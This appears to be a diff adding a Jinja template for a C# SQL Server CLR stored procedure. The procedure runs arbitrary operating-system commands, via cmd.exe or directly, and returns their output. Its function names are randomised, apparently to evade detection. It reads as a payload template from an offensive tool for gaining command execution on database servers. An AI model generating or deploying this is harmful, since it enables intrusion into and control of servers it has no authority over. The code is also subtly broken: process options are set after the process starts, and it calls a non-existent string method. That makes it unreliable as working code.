@@ -1,0 +1,29 @@
+{% if section == "globals" %}
+    using System.Diagnostics;
+{% elif section == "text" %}
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void {{ "cmd_exec_fn" | RNDVAR }}(SqlString execCommand)
+    {
+        Process proc = new Process();
+        {% if shell %}
+            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
+        {% else %}
+            string[] cmd = execCommand.Value.Split(" ");
+            proc.StartInfo.FileName = cmd[0];
+
+            if(cmd.Length > 1){
+                proc.StartInfo.Arguments = " ".Join(cmd.Skip(1));
+            }
+        {% endif %}
+        proc.Start();
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+
+        string output = proc.StandardOutput.ReadToEnd().ToString();
+        {{ "response" | RNDVAR }}(output);
+
+        proc.WaitForExit();
+        proc.Close();
+    }
+{% endif %}
